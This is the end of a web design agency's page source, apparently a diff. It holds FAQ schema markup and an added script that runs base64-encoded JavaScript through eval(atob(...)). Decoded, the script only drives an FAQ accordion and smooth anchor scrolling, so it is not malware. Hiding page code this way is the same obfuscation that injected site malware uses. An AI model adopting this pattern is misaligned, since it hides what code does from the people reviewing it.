uptime."}},{"@type":"Question","name":"Will my website be SEO-friendly?","acceptedAnswer":{"@type":"Answer","text":"Yes. Every site includes clean code, proper heading structure, schema markup, XML sitemaps, fast loading, image optimisation, and meta tag setup. We build the technical SEO foundation so your content can rank."}},{"@type":"Question","name":"Can I update the website myself after launch?","acceptedAnswer":{"@type":"Answer","text":"Yes. We build on WordPress with Elementor so you can easily update text, images, and pages without touching code. We also provide a training session and documentation to get you comfortable with your new site."}},{"@type":"Question","name":"Do you offer website maintenance?","acceptedAnswer":{"@type":"Answer","text":"Yes. We offer monthly maintenance plans that include security updates, plugin updates, backups, performance monitoring, and minor content changes. This keeps your site secure, fast, and running smoothly."}},{"@type":"Question","name":"How many revisions do I get?","acceptedAnswer":{"@type":"Answer","text":"We include 2 rounds of design revisions at the mockup stage and 1 round during development. Most clients are happy after the first revision. Additional revisions beyond the included rounds are available at a fair hourly rate."}},{"@type":"Question","name":"Can you redesign my existing website?","acceptedAnswer":{"@type":"Answer","text":"Yes. We specialise in website redesigns that modernise your look while preserving your existing SEO rankings, content, and URL structure. We set up proper 301 redirects and handle the migration carefully so you do not lose search traffic."}},{"@type":"Question","name":"Do you build e-commerce websites?","acceptedAnswer":{"@type":"Answer","text":"Yes. We build e-commerce stores on WooCommerce and Shopify with product management, payment gateways, shipping integrations, inventory tracking, and optimised checkout flows designed to maximise sales."}},{"@type":"Question","name":"What do you need from me to get started?","acceptedAnswer":{"@type":"Answer","text":"We need your branding assets (logo, colours, fonts), content (text and images), examples of websites you like, and a clear idea of your goals. If you do not have content ready, we can create it for you as part of our content marketing services."}},{"@type":"Question","name":"Will my website be secure?","acceptedAnswer":{"@type":"Answer","text":"Yes. We implement SSL certificates, security plugins, firewall protection, regular backups, and hardened WordPress configurations. We follow security best practices to protect your site from common threats."}},{"@type":"Question","name":"Do you provide website analytics?","acceptedAnswer":{"@type":"Answer","text":"Yes. We set up Google Analytics 4, Google Search Console, and any additional tracking you need. You will have full visibility into your traffic, user behaviour, conversions, and performance from day one."}},{"@type":"Question","name":"What makes BrightlyFuture different from other web design agencies?","acceptedAnswer":{"@type":"Answer","text":"We focus on results, not just aesthetics. Every website we build is optimised for speed, SEO, and conversions. We combine beautiful design with data-driven strategy to create websites that actually grow your business, not just look good in a portfolio."}}]}</script>
+
+<script>eval(atob("KGZ1bmN0aW9uKCl7CiAgdmFyIGRvbmU9ZmFsc2U7CiAgZnVuY3Rpb24gaW5pdCgpewogICAgdmFyIHdyYXA9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3dkLXdyYXAnKTsKICAgIGlmKCF3cmFwfHxkb25lKXJldHVybjsKICAgIGRvbmU9dHJ1ZTsKICAgIHdyYXAucXVlcnlTZWxlY3RvckFsbCgnLndkLWZhcS1xJykuZm9yRWFjaChmdW5jdGlvbihidG4pewogICAgICBidG4uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLGZ1bmN0aW9uKCl7CiAgICAgICAgdmFyIGl0ZW09dGhpcy5wYXJlbnRFbGVtZW50OwogICAgICAgIHZhciBpc09wZW49aXRlbS5jbGFzc0xpc3QuY29udGFpbnMoJ3dkLWZhcS1vcGVuJyk7CiAgICAgICAgd3JhcC5xdWVyeVNlbGVjdG9yQWxsKCcud2QtZmFxLWl0ZW0nKS5mb3JFYWNoKGZ1bmN0aW9uKGVsKXtlbC5jbGFzc0xpc3QucmVtb3ZlKCd3ZC1mYXEtb3BlbicpO30pOwogICAgICAgIGlmKCFpc09wZW4paXRlbS5jbGFzc0xpc3QuYWRkKCd3ZC1mYXEtb3BlbicpOwogICAgICB9KTsKICAgIH0pOwogICAgd3JhcC5xdWVyeVNlbGVjdG9yQWxsKCdhW2hyZWZePSIjIl0nKS5mb3JFYWNoKGZ1bmN0aW9uKGEpewogICAgICBhLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJyxmdW5jdGlvbihlKXsKICAgICAgICB2YXIgdGFyZ2V0PWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IodGhpcy5nZXRBdHRyaWJ1dGUoJ2hyZWYnKSk7CiAgICAgICAgaWYodGFyZ2V0KXtlLnByZXZlbnREZWZhdWx0KCk7dGFyZ2V0LnNjcm9sbEludG9WaWV3KHtiZWhhdmlvcjonc21vb3RoJyxibG9jazonc3RhcnQnfSk7fQogICAgICB9KTsKICAgIH0pOwogIH0KICBpZihkb2N1bWVudC5yZWFkeVN0YXRlPT09J2xvYWRpbmcnKXtkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJyxpbml0KTt9ZWxzZXtpbml0KCk7fQogIHZhciBhdHRlbXB0cz0wOwogIHZhciBwb2xsPXNldEludGVydmFsKGZ1bmN0aW9uKCl7CiAgICBhdHRlbXB0cysrOwogICAgaWYoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3dkLXdyYXAnKSl7aW5pdCgpO2NsZWFySW50ZXJ2YWwocG9sbCk7fQogICAgaWYoYXR0ZW1wdHM+NTApY2xlYXJJbnRlcnZhbChwb2xsKTsKICB9LDIwMCk7Cn0pKCk7Cg=="));</script>
